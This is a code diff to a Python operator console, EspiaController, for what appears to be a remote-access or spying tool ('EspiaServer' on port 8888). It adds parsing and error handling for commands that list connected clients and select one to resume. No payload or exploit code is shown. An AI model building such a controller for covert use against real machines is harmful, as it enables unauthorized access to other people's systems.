@@ -1,4 +1,6 @@
+from multiprocessing.sharedctypes import Value
 from EspiaServer import EspiaServer
+from EspiaServer import EspiaErrors
 import threading
 
 class EspiaController(threading.Thread):
@@ -18,18 +20,40 @@ class EspiaController(threading.Thread):
     
     def start_controller(self):
         while True:
-            command = input(">> ")
+            input_text = input(">> ")
+            parameters = input_text.split(" ")
+            command = parameters[0]
+            parameters = parameters[1:]
 
             if (command == "list"):
                 self.server_thread.list_clients()
             elif (command == "select"):
-                #parameters = command.split(" ")
-                self.server_thread.resume_client(0)
-                with self.condition:
-                    self.condition.wait()
+                self.cmd_select(parameters)
             elif (command == "exit"):
                 self.server_thread.shutdown()
                 return
+    
+    def cmd_select(self, parameters):
+        if (len(parameters) == 0):
+            self.server_thread.list_clients()
+        else:
+            try:
+                index = int(parameters[0])
+            except ValueError:
+                print("[!] Invalid index")
+                return
+                    
+            try:
+                self.server_thread.resume_client(index)
+            except IndexError:
+                print("[!] Invalid index")
+                return
+            except EspiaErrors.NoClientsConnected:
+                print("[!] No clients connected")
+                return
+
+            with self.condition:
+                    self.condition.wait()
 
 controller = EspiaController(8888)
 controller.start()
